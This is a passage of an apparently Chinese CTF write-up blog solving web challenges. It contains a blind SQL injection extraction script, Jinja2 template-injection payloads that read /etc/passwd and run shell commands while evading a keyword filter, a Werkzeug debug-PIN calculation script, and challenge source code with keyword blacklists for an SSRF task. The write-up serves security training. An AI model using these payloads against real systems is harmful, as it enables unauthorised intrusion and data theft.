data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">'0^('</span>+payload+<span class="string">')'</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = requests.post(url,data=data)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line">            <span class="comment"># t1=time.time()</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(html,'*-*-*-*-*-*', mid,'    ',payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    <span class="comment"># print(database)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">(db)</span>:</span></span><br><span class="line">    db=str2hex(db)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema='</span>+db+<span class="string">')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    table = str2hex(table)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class="string">')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea2(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea2</span><span class="params">(length=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    dic=<span class="string">'-'</span>+<span class="string">'0123456789'</span>+string.ascii_lowercase+<span class="string">'&#123;&#125;~'</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= length :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">            payload = <span class="string">"select (select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh)"</span>.format(str2hex(result+dic[each]))</span><br><span class="line">            print(result+dic[each])</span><br><span class="line">            <span class="comment"># t1=time.time()</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(html[0:-6])</span></span><br><span class="line">            <span class="keyword">if</span> error == <span class="number">0</span> <span class="keyword">and</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> html:</span><br><span class="line">                result +=dic[each<span class="number">-1</span>]</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database() #ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tables('ctf')#users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class="line"></span><br><span class="line">binsea2()</span><br></pre></td></tr></table></figure>





<h1 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h1><p>打开题目</p>
<p>在解密中随意输入几个，让其报错，爆出部分代码，发现是一个flask框架写的base64的加解密小工具运行在PYTHON3.7。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果 ： &#123;0&#125;"</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">"no no no !!"</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">         text = <span class="string">""</span></span><br></pre></td></tr></table></figure>

<p>是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码</p>
<p><img src="../pic/114.png" alt=""></p>
<p>任意文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">base64后</span><br><span class="line">e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="../pic/115.png" alt=""></p>
<p>提取/app/app.py所有代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'s_e_c_r_e_t_k_e_y'</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    text = StringField(<span class="string">'BASE64加密'</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'提交'</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm1</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    text = StringField(<span class="string">'BASE64解密'</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'提交'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span></span><br><span class="line">    black_list = [<span class="string">"flag"</span>,<span class="string">"os"</span>,<span class="string">"system"</span>,<span class="string">"popen"</span>,<span class="string">"import"</span>,<span class="string">"eval"</span>,<span class="string">"chr"</span>,<span class="string">"request"</span>,</span><br><span class="line">                  <span class="string">"subprocess"</span>,<span class="string">"commands"</span>,<span class="string">"socket"</span>,<span class="string">"hex"</span>,<span class="string">"base64"</span>,<span class="string">"*"</span>,<span class="string">"?"</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> str.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hint',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">    txt = <span class="string">"失败乃成功之母！！"</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"hint.html"</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果  :&#123;0&#125;"</span>.format(str(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'encode'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">""</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>,form = form ,method = <span class="string">"加密"</span> ,img = <span class="string">"flask.png"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果 ： &#123;0&#125;"</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">"no no no !!"</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">""</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>,form = form, method = <span class="string">"解密"</span> , img = <span class="string">"flask1.png"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;name&gt;',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"404.html"</span>,name = name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看见黑名单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">"flag"</span>,<span class="string">"os"</span>,<span class="string">"system"</span>,<span class="string">"popen"</span>,<span class="string">"import"</span>,<span class="string">"eval"</span>,<span class="string">"chr"</span>,<span class="string">"request"</span>,</span><br><span class="line">                  <span class="string">"subprocess"</span>,<span class="string">"commands"</span>,<span class="string">"socket"</span>,<span class="string">"hex"</span>,<span class="string">"base64"</span>,<span class="string">"*"</span>,<span class="string">"?"</span>]</span><br></pre></td></tr></table></figure>



<p>直接上Vulhub的payload修改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'ev'</span>+<span class="string">'al'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eva'</span>+<span class="string">'l'</span>](<span class="string">'__imp'</span>+<span class="string">'ort__("o"+"s").pop'</span>+<span class="string">'en("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>查看目录  ls</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">app bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br></pre></td></tr></table></figure>

<p>查看flag   cat this_is_the_fl”+”ag.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure>

<p>想通过计算PIN，但是获取所有信息后计算出来不一致。</p>
<h3 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h3><p>计算PIN <a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">参考链接</a></p>
<p>需要获取六个变量的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username <span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line">modname <span class="comment"># flask.app</span></span><br><span class="line"></span><br><span class="line">getattr(app, <span class="string">'__name__'</span>, getattr(app.__class__, <span class="string">'__name__'</span>)) <span class="comment"># Flask</span></span><br><span class="line"></span><br><span class="line">getattr(mod, <span class="string">'__file__'</span>, <span class="literal">None</span>) <span class="comment"># flask目录下的一个app.py的绝对路径</span></span><br><span class="line"></span><br><span class="line">uuid.getnode() <span class="comment"># mac地址十进制  02:42:ae:00:cf:18-&gt;2485410385688</span></span><br><span class="line"></span><br><span class="line">get_machine_id() <span class="comment"># /etc/machine-id   这里是/proc/self/cgroup  </span></span><br><span class="line"><span class="number">12</span>:blkio:/docker/<span class="number">29747</span>fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76</span><br></pre></td></tr></table></figure>

<p>计算脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410385688'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">'29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>拿到pin登录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[console ready]&gt;&gt;&gt; <span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">"ls /"</span>).read()</span><br><span class="line"><span class="string">'app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n'</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">"cat /this_is_the_flag.txt"</span>).read()</span><br><span class="line"><span class="string">'flag&#123;033e49d3-6201-41c6-9725-e95898cbc3d9&#125;\n'</span></span><br></pre></td></tr></table></figure>



<h1 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h1><p>打开题目有两个选择</p>
<p><img src="../pic/117.png" alt=""></p>
<p>选择Only admin can use this</p>
<p>是一个文件上传的界面</p>
<p><img src="../pic/116.png" alt=""></p>
<p>选择Click here to get the source查看源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)  <span class="comment">//终端打印url</span></span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;    <span class="comment">//定义黑名单</span></span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)  <span class="comment">//在终端打印信息</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>得知大概是要通过ssrf上传包含flag的pug文件拿到flag</p>
<p>在文件上传界面中，要保证地址是127.0.0.1</p>
